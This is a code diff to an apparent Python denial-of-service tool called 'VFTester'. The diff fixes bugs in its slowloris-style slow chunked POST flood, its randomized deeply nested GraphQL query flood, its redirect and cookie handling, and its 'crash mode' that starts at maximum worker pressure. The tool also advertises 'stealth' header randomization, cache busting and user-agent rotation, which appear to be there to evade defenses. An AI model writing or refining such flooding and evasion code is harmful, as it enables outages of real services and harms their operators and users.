@@ -256,7 +256,7 @@ class KeyboardHandler:
 
     def _read_char_unix(self) -> Optional[str]:
         try: return sys.stdin.read(1)
-        except: return None
+        except Exception: return None
 
     def get_key(self) -> Optional[str]:
         keys = []
@@ -276,7 +276,7 @@ class KeyboardHandler:
             except asyncio.CancelledError: pass
         if not IS_WINDOWS and self._old_settings and self._fd and HAS_TERMIOS:
             try: termios.tcsetattr(self._fd, termios.TCSADRAIN, self._old_settings)
-            except: pass
+            except Exception: pass
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -642,8 +642,13 @@ class VFTester:
             if force_refresh:
                 self._invalid_count = 0
                 try:
+                    # FIX: Changed allow_redirects=True to False.
+                    # With allow_redirects=True, aiohttp follows all redirects automatically,
+                    # so resp.status is NEVER 301/302/303/307/308 — making the redirect
+                    # handling block below unreachable dead code. We need allow_redirects=False
+                    # to capture the redirect chain and follow it manually (to preserve cookies).
                     async with session.get(self.url, headers=self._base_headers(),
-                                           ssl=False, allow_redirects=True) as resp:
+                                           ssl=False, allow_redirects=False) as resp:
                         # Handle redirect to login page — follow and re-fetch
                         if resp.status in (301, 302, 303, 307, 308):
                             redirect_url = resp.headers.get('Location', self.url)
@@ -805,8 +810,10 @@ class VFTester:
             try:
                 headers = self._base_headers()
                 headers["Content-Type"] = "application/x-www-form-urlencoded"
-                # v5 FIX: Don't set Content-Length with Transfer-Encoding: chunked (RFC 7230)
-                headers["Transfer-Encoding"] = "chunked"
+                # FIX: Removed Transfer-Encoding: chunked header.
+                # When passing an async generator as data, aiohttp automatically uses
+                # chunked transfer encoding. Setting it manually causes duplicate headers
+                # or malformed requests in some aiohttp versions.
                 
                 async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
                                        ssl=False, timeout=aiohttp.ClientTimeout(total=60),
@@ -1035,18 +1042,20 @@ class VFTester:
         if not endpoint: return
         consecutive_fails = 0
 
-        # GraphQL query templates — from simple to deeply nested
-        graphql_queries = [
-            '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
-            '{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}',
-            '{"query":"{ products { id name price reviews { id rating body author { id name } } category { id name products { id } } } }"}',
-            f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title description content {{ ... on User {{ email posts {{ id }} }} ... on Post {{ body author {{ name }} }} }} }} }}"}}',
-            f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\", authorId:{random.randint(1,999)} }}) {{ id title }} }}"}}',
-        ]
-
         while not self._stop.is_set():
             t = time.time()
             try:
+                # FIX: Moved graphql_queries INSIDE the while loop.
+                # Previously, f-strings with rand_user()/rand_pass()/random.randint()
+                # were evaluated ONCE at list-creation time, then the same stale values
+                # were reused on every loop iteration forever.
+                graphql_queries = [
+                    '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
+                    '{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}',
+                    '{"query":"{ products { id name price reviews { id rating body author { id name } } category { id name products { id } } } }"}',
+                    f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title description content {{ ... on User {{ email posts {{ id }} }} ... on Post {{ body author {{ name }} }} }} }} }}"}}',
+                    f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\", authorId:{random.randint(1,999)} }}) {{ id title }} }}"}}',
+                ]
                 query = random.choice(graphql_queries)
                 headers = {**self._base_headers(),
                           "Content-Type": "application/json",
@@ -1096,9 +1105,10 @@ class VFTester:
                     await self.live_log.add("spa_route", resp.status, elapsed, None, url, result.hint)
                     self.health_monitor.record(result)
             except Exception as e:
-                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
+                # FIX: mode was "page" instead of "spa_route" — mis-categorized errors in stats
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="spa_route",
                                   err=type(e).__name__, url=url)
-                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
+                await self.live_log.add("spa_route", None, result.rt, type(e).__name__, url)
                 self.health_monitor.record(result)
             self._record(result)
             if not result.ok:
@@ -2339,19 +2349,19 @@ async def main():
         print(f"  {C.CY}[STEALTH] Workers: {tester.initial_workers}->{tester.max_workers} | Step: +{tester.step} every {tester.step_duration}s | Delay: {tester.request_delay_ms}ms{C.RS}")
         print(f"  {C.CY}[STEALTH] Header randomization: ON | Cache bust: ON | UA rotation: ON{C.RS}")
 
-    # Crash mode — start at maximum pressure
+    # Apply overrides FIRST (before crash mode uses them)
+    if args.max_workers:
+        tester.max_workers = args.max_workers
+    if args.step:
+        tester.step = args.step
+
+    # Crash mode — start at maximum pressure (must come AFTER max_workers override)
     if crash_mode:
         tester.initial_workers = tester.max_workers
         tester.step = tester.max_workers
         tester.health_monitor.crash_mode_active = True
         print(f"  {C.BD}{C.R}[CRASH MODE] Starting at MAXIMUM pressure!{C.RS}")
         print(f"  {C.BD}{C.R}[CRASH MODE] Workers: {tester.max_workers:,} | Step: +{tester.step}{C.RS}")
-
-    # Apply overrides
-    if args.max_workers:
-        tester.max_workers = args.max_workers
-    if args.step:
-        tester.step = args.step
 
     # Signal handlers (Unix only)
     if not IS_WINDOWS:
